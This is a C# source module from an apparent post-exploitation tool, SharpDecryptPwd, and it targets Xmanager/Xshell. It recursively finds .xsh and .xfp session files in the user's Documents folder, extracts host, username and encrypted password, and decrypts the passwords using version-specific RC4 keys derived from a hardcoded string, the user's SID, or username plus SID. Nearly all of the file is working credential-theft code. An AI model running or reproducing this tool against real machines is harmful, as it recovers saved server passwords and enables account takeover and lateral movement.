using System;
using System.Text;
using SharpDecryptPwd.Domain;
using System.Security.Cryptography;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using SharpDecryptPwd.Lib.Crypt;
using System.Security.Principal;
using SharpDecryptPwd.Helpers;
using System.Linq;

namespace SharpDecryptPwd.Commands
{
    public class Xmanager : ICommand
    {

        public static string CommandName => "xmanager";

        public void DecryptPwd(ArgumentParserContent arguments)
        {
            if (arguments.user != null && arguments.sid != null && arguments.path != null)
            {
                DecryptLocal(arguments.user, arguments.sid, arguments.path);
            }
            else
            {
                DecryptInTarget();
            }
        }

        public void DecryptInTarget()
        {
            WindowsIdentity currentUser = WindowsIdentity.GetCurrent();
            string sid = currentUser.User.ToString();
            string userName = currentUser.Name.Split('\\')[1];
            string UserSid = null;


            // 获取 MyDocuments 下所有关于 Xmanager 相关 session 文件
            List<string> sessionFiles = Search(new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)));
            if (sessionFiles.Count == 0)
            {
                Writer.ErrorLine("No session file related to Xmanager was obtained ");
            }
            else
            {
                foreach (string sessionFile in sessionFiles)
                {
                    Writer.Log("Session File: " + sessionFile);
                    List<string> configs = ReadConfigFile(sessionFile);
                    if (configs.Count < 4)
                    {
                        Writer.ErrorLine("Exception, please view the content manually.");
                    }
                    else
                    {
                        Writer.Out("Version", configs[0]);
                        Writer.Out("Host", configs[1]);
                        Writer.Out("UserName", configs[2]);
                        Writer.Out("rawPass", configs[3]);
                        Writer.Out("UserName", userName);
                        Writer.Out("Sid", sid);
                        string ver = configs[0].Replace("\r", "").ToString();
                        /*if (ver < 5.1)
                         {
                             Writer.ErrorLine("Versions below 5.1 are not supported");
                         }
                         else if (ver == 5.1 || ver == 5.2)
                         {
                             UserSid = sid;
                         }
                         else if (ver >= 5.2)
                         {
                             UserSid = userName + sid;
                             //UserSid = "RcoIlS-1-5-21-3990929841-153547143-3340509336-1001";
                         }
                         */
                        Decrypt(userName, sid, configs[3], ver);
                    }
                }
            }
        }

        public void DecryptLocal(string userName, string sid, string sessionPath)
        {

            // 获取 MyDocuments 下所有关于 Xmanager 相关 session 文件
            List<string> sessionFiles = Search(new DirectoryInfo(sessionPath));
            if (sessionFiles.Count == 0)
            {
                Writer.ErrorLine("No session file related to Xmanager was obtained ");
            }
            else
            {
                foreach (string sessionFile in sessionFiles)
                {
                    Writer.Log("Session File: " + sessionFile);
                    List<string> configs = ReadConfigFile(sessionFile);
                    if (configs.Count < 4)
                    {
                        Writer.ErrorLine("Exception, please view the content manually.");
                    }
                    else
                    {
                        Writer.Out("Version", configs[0]);
                        Writer.Out("Host", configs[1]);
                        Writer.Out("UserName", configs[2]);
                        Writer.Out("rawPass", configs[3]);
                        Writer.Out("UserName", userName);
                        Writer.Out("Sid", sid);
                        string ver = configs[0].Replace("\r", "").ToString();
                        /*if (ver < 5.1)
                         {
                             Writer.ErrorLine("Versions below 5.1 are not supported");
                         }
                         else if (ver == 5.1 || ver == 5.2)
                         {
                             UserSid = sid;
                         }
                         else if (ver >= 5.2)
                         {
                             UserSid = userName + sid;
                             //UserSid = "RcoIlS-1-5-21-3990929841-153547143-3340509336-1001";
                         }
                         */
                        Decrypt(userName, sid, configs[3], ver);
                    }
                }
            }
        }

        public static List<string> resultSession = new List<string>();
        /// <summary>
        /// 获取 MyDocuments 下所有关于 Xmanager 相关 session 文件
        /// </summary>
        /// <param name="filePath"></param>
        /// <returns></returns>
        private static List<string> Search(FileSystemInfo filePath)
        {
            try
            {
                if (!filePath.Exists) return resultSession;
                DirectoryInfo dir = filePath as DirectoryInfo;
                if (dir == null) return resultSession;
                FileSystemInfo[] files = dir.GetFileSystemInfos();
                for (int i = 0; i < files.Length; i++)
                {

                    FileInfo file = files[i] as FileInfo;
                    if (file != null)
                    {
                        if (file.FullName.Contains(".xsh"))
                        {
                            resultSession.Add(file.FullName);
                            //Console.WriteLine(file.FullName);
                        }
                        else if (file.FullName.Contains(".xfp"))
                        {
                            resultSession.Add(file.FullName);
                            //Console.WriteLine(file.FullName);
                        }
                    }
                    else
                    {
                        Search(files[i]);
                    }
                }
            }
            catch
            { }
            return resultSession;
        }

        /// <summary>
        /// 读取 xsh 文件
        /// </summary>
        /// <param name="path"></param>
        /// <returns></returns>
        static List<string> ReadConfigFile(string path)
        {
            string fileData = File.ReadAllText(path);
            string Version = null;
            string Host = null;
            //string Port = null;
            string Username = null;
            string Password = null;
            List<string> resultString = new List<string>();

            try
            {
                Version = Regex.Match(fileData, "Version=(.*)", RegexOptions.Multiline).Groups[1].Value;
                Host = Regex.Match(fileData, "Host=(.*)", RegexOptions.Multiline).Groups[1].Value;
                Username = Regex.Match(fileData, "UserName=(.*)", RegexOptions.Multiline).Groups[1].Value;
                Password = Regex.Match(fileData, "Password=(.*)", RegexOptions.Multiline).Groups[1].Value;
            }
            catch
            { }
            resultString.Add(Version);
            resultString.Add(Host);
            resultString.Add(Username);
            if (Password.Length > 3)
            {
                resultString.Add(Password);
            }


            return resultString;
        }

        /// <summary>
        /// 解密过程
        /// </summary>
        /// <param name="username"></param>
        /// <param name="sid"></param>
        /// <param name="rawPass"></param>
        /// <param name="ver"></param>
        /// https://github.com/JDArmy/SharpXDecrypt/blob/main/C%23/XClass.cs#L73
        static void Decrypt(string username,string sid, string rawPass, string ver)
        {
            if (ver.StartsWith("5.0") || ver.StartsWith("4") || ver.StartsWith("3") || ver.StartsWith("2"))
            {
                byte[] data = Convert.FromBase64String(rawPass);

                byte[] Key = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes("!X@s#h$e%l^l&"));

                byte[] passData = new byte[data.Length - 0x20];
                Array.Copy(data, 0, passData, 0, data.Length - 0x20);

                byte[] decrypted = RC4Crypt.Decrypt(Key, passData);

                Writer.Out("Decrypt rawPass", Encoding.ASCII.GetString(decrypted) + "\r\n");
            }
            else if (ver.StartsWith("5.1") || ver.StartsWith("5.2"))
            {
                byte[] data = Convert.FromBase64String(rawPass);

                byte[] Key = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(sid));

                byte[] passData = new byte[data.Length - 0x20];
                Array.Copy(data, 0, passData, 0, data.Length - 0x20);

                byte[] decrypted = RC4Crypt.Decrypt(Key, passData);

                Writer.Out("Decrypt rawPass", Encoding.ASCII.GetString(decrypted) + "\r\n");
            }else if (ver.StartsWith("5") || ver.StartsWith("6") || ver.StartsWith("7.0"))
            {
                byte[] data = Convert.FromBase64String(rawPass);

                byte[] Key = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(username+sid));

                byte[] passData = new byte[data.Length - 0x20];
                Array.Copy(data, 0, passData, 0, data.Length - 0x20);

                byte[] decrypted = RC4Crypt.Decrypt(Key, passData);

                Writer.Out("Decrypt rawPass", Encoding.ASCII.GetString(decrypted) + "\r\n");
            }else if(ver.StartsWith("7"))
            {
                string strkey1 = new string(username.ToCharArray().Reverse().ToArray()) + sid;
                string strkey2 = new string(strkey1.ToCharArray().Reverse().ToArray());

                byte[] data = Convert.FromBase64String(rawPass);

                byte[] Key = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(strkey2));

                byte[] passData = new byte[data.Length - 0x20];
                Array.Copy(data, 0, passData, 0, data.Length - 0x20);

                byte[] decrypted = RC4Crypt.Decrypt(Key, passData);

                Writer.Out("Decrypt rawPass", Encoding.ASCII.GetString(decrypted) + "\r\n");

            }
        }
    }
}
